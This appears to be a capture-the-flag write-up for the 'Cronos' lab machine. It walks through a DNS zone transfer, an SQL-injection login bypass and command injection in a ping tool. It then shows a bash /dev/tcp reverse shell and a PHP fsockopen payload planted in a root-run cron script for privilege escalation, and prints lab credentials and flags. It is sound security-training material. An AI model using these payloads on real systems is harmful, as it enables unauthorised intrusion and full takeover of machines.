### Summary
We start this box with a `DNS` `TCP` zone transfer to uncover 3 virtual hosts. Enumerating the hosts brings us to a SQL-injectable admin domain which redirects to a command-injectable page, giving us a foothold on the box as `www-data`. We then enumerate to find a system-wide crontab in `/etc/crontab` where `root` is running an editable `php` script which we poison to spawn us a `root` shell

### Tools
- `nslookup` - DNS IP detection
- `dig` - DNS zone transfer
- `ffuf` - DNS subdomain bruteforce
- `mysql`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#DNS - TCP/UDP 53]]
	- [[#Virtual Host Enumeration]]
- [[#Web - TCP 80]]
	- [[#admin.cronos.htb]]
	- [[#Net Tool v0.1]]
###### [[#User Shell - www-data]]
- [[#Reverse Bash Shell]]
- [[#Enumeration]]
	- [[#MySQL - TCP 3306]]
###### [[#Root Shell]]
- [[#/var/www/laravel/artisan Poisoning]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.227.211 -oN nmap/tcp
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,53,80 -sCV -vv 10.129.227.211 -oN nmap/tcpscripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

❯ sudo nmap -sU -p- --min-rate 10000 -vv 10.129.227.211 -oN nmap/udp
PORT   STATE SERVICE REASON
53/udp open  domain  udp-response ttl 63
```
- Looks like we've got `SSH`, `DNS`, and `HTTP`
- The TTL matches that of a posix system
- Given the `OpenSSH 7.2p2` and `Apache httpd 2.4.18` it looks like we're working with Ubuntu `16.04 - 16.10`

## DNS - TCP/UDP 53
---
- For DNS enumeration, the first thing to do is try to resolve the IPs of Cronos. I’ll use `nslookup`, setting the server to Cronos, and then looking up Cronos’ IP:
```sh
❯ nslookup                              
> server 10.129.227.211
Default server: 10.129.227.211
Address: 10.129.227.211#53
> 10.129.227.211
211.227.129.10.in-addr.arpa     name = ns1.cronos.htb.
```
- We've now got the nameserver domain `ns1.cronos.htb` which extends the machin'e domain of `cronos.htb`

### Virtual Host Enumeration
- Whenever there's `TCP` `DNS` it's always worth trying a [zone transfer](https://en.wikipedia.org/wiki/DNS_zone_transfer):
```sh
❯ dig axfr cronos.htb @10.129.227.211

; <<>> DiG 9.18.41 <<>> axfr cronos.htb @10.129.227.211
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 23 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Thu Dec 25 14:30:34 EST 2025
;; XFR size: 7 records (messages 1, bytes 203)
```
- From the zone transfer we can see `admin.cronos.htb` and `www.cronos.htb`

- We can add the following to our `/etc/hosts` file:
```text
10.129.227.211     cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb
```

- Since virtual hosts are being used here, we can try to run a quick `ffuf` DNS subdomain brute force to see if there's anything else out there:
```sh
❯ ffuf -u "http://FUZZ.cronos.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-110000.txt 

ns1           [Status: 200, Size: 11439, Words: 3534, Lines: 380, Duration: 30ms]
admin         [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 50ms]
www           [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 221ms]
```
- Nothing new

## Web - TCP 80
---
- Visiting the site by Cronos' IP address prings us to a default `Apache 2` welcome page
- Visiting `http://cronos.htb` or `http://www.cronos.htb` brings us to a minimalist webpage:
![[Pasted image 20251227022103.png]]
- All the subtext redirects us to `laravel` web pages, a web application framework
- Running `ffuf` again for subdirectories only gives us `js`, `css`, `server-status`

- We can make some quick searches for `laravel` in `searchsploit` but we don't yet know the type or version of `laravel` 

### admin.cronos.htb
- When we navigate to `http://admin.cronos.htb` we see a login page:
![[Pasted image 20251227022912.png]]

- When we submit an attempt at credentials: `admin:admin` we get `Your Login Name or Password is invalid`, no information leakage here
- We can attempt a simple SQL injection query like `' OR 1=1 -- ` and we successfully log into the portal!

### Net Tool v0.1
- We're now faced with a web page that looks to be a `ping` command wrapper, classic CTF challenge
- When I select the `ping` command and input my IP address `10.10.14.50`, the following request is sent out:
```http
command=ping+-c+1&host=10.10.14.50
```
- If it follows typical `ping` bash command syntax, the two are going to be concatenated and executed
- We can modify the request like so:
```http
command=ls+-lah&host=/etc
```
```html
drwxr-xr-x 95 root root   4.0K Jun 17  2022 .<br>
drwxr-xr-x 23 root root   4.0K May 10  2022 ..<br>
-rw-------  1 root root      0 Feb 15  2017 .pwd.lock<br>
drwxr-xr-x  5 root root   4.0K May 10  2022 X11<br>
drwxr-xr-x  3 root root   4.0K May 10  2022 acpi<br>
-rw-r--r--  1 root root   3.0K Feb 15  2017 adduser.conf<br>
drwxr-xr-x  2 root root   4.0K May 10  2022 alternatives<br>
drwxr-xr-x  8 root root   4.0K May 10  2022 apache2<br>
drwxr-xr-x  3 root root   4.0K May 10  2022 apm<br>
drwxr-xr-x  3 root root   4.0K May 10  2022 apparmor<br>
drwxr-xr-x  9 root root   4.0K May 10  2022 apparmor.d<br>
drwxr-xr-x  3 root root   4.0K May 10  2022 apport<br>
drwxr-xr-x  6 root root   4.0K May 10  2022 apt<br>
-rw-r-----  1 root daemon  144 Jan 15  2016 at.deny<br>
...
```
- It works! We've got RCE

# User Shell - www-data
## Reverse Bash Shell
---
- We can turn our RCE into a shell using a reverse bash tcp connection:
```sh
bash -c 'bash -i &> /dev/tcp/10.10.14.50/12345 0>&1'
```
- Without the `bash -c` preamble it doesn't work for some reason
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.227.211.
Ncat: Connection from 10.129.227.211:32876.
bash: cannot set terminal process group (1363): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ python -c 'import pty; pty.spawn("bash")'
python -c 'import pty; pty.spawn("bash")'
www-data@cronos:/var/www/admin$ ^Z
[1]  + 1064597 suspended  nc -lvnp 12345
❯ stty raw -echo; fg
[1]  + 1064597 continued  nc -lvnp 12345
```

## Enumeration
---
- We can quickly grab the `user.txt` file wherever it is with the following `find` command:
```sh
www-data@cronos:/var/www/admin$ find / -type f -name "user.txt" -exec cat {} + 2>/dev/null
0f6cf9220bbdf74877d2cff14c0f680a

www-data@cronos:/var/www/admin$ find / -type f -name "user.txt" 2>/dev/null 
/home/noulis/user.txt
www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
0f6cf9220bbdf74877d2cff14c0f680a
```

- A quick `sudo -l` immediately prompts for a password so that's a no-go
- Performing `find` on directories we own mostly returns `/var/www/laravel*`
- Since we're in `/var/www/admin`, we can check the files in our current directory and see `config.php`:
```php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```
- The password is not the same for `sudo`, nor is it the `root` `SSH` password

### MySQL - TCP 3306
- If we check the running processes, we see that `mysql` is currently running
- We can connect to it like so:
```sh
www-data@cronos:/var/www/admin$ mysql -u admin -pkEjdbRigfBHUREiNSDs  
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 29
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.01 sec)

mysql> use admin
mysql> SHOW TABLES;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+

mysql> SELECT * FROM admin.users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```
- This new password didn't work for `root` or `sudo` or `noutis` either

- There is no crontab for `www-data` and I don't have permission to list `/var/spool/cron/crontabs` 
- However, there is something present in system-wide crontab at `/etc/crontab`:
```sh
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
- Looks like the `root` users runs a cron every minute executing a `php` script in a location that we have write access! We can easily poison this file

# Root Shell
## /var/www/laravel/artisan Poisoning
---
- We can add the following `php` code to the top of the file:
```php
#!/usr/bin/env php
<?php

$sock=fsockopen("10.10.14.50",12345);
system("sh <&3 >&3 2>&3");
...
```
- Now we need only listen on our host:
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.227.211.
Ncat: Connection from 10.129.227.211:32880.
whoami
root
python -c 'import pty; pty.spawn("bash")'
root@cronos:~# ^Z
[1]  + 1123631 suspended  nc -lvnp 12345
❯ stty raw -echo; export TERM=xterm; fg
[1]  + 1123631 continued  nc -lvnp 12345
root@cronos:~# cat root.txt 
ae73327b94bfe7eac4be9b9d1907118a
```
